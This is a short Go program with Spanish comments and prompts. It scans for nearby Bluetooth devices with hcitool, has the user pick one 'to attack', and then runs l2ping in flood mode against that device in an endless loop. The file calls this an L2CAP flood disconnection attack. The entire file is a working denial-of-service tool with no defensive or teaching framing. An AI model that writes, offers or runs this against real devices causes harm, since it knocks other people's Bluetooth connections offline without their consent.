package main

import (
	"fmt"
	"os/exec"
	"strings"
	"time"
)

// Escanea dispositivos Bluetooth cercanos
func scanBluetoothDevices() []string {
	fmt.Println("Escaneando dispositivos Bluetooth...")
	cmd := exec.Command("hcitool", "scan")
	output, err := cmd.Output()
	if err != nil {
		fmt.Println("Error al ejecutar escaneo:", err)
		return nil
	}

	var devices []string
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		if len(fields) >= 2 && fields[0] != "Scanning..." {
			devices = append(devices, fields[0])
			fmt.Printf("Dispositivo encontrado: %s - %s\n", fields[0], strings.Join(fields[1:], " "))
		}
	}
	return devices
}

// Ataque de desconexión usando L2CAP Flood
func deauthBluetooth(target string) {
	fmt.Printf("Iniciando ataque contra %s...\n", target)
	for {
		cmd := exec.Command("l2ping", "-i", "hci0", "-s", "600", "-f", target)
		err := cmd.Run()
		if err != nil {
			fmt.Println("Error en ataque:", err)
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
}

func main() {
	devices := scanBluetoothDevices()
	if len(devices) == 0 {
		fmt.Println("No se encontraron dispositivos Bluetooth.")
		return
	}

	fmt.Println("Selecciona un dispositivo para atacar:")
	for i, device := range devices {
		fmt.Printf("[%d] %s\n", i, device)
	}

	var choice int
	fmt.Print("Ingrese el número del dispositivo: ")
	fmt.Scan(&choice)

	if choice >= 0 && choice < len(devices) {
		deauthBluetooth(devices[choice])
	} else {
		fmt.Println("Selección inválida.")
	}
}
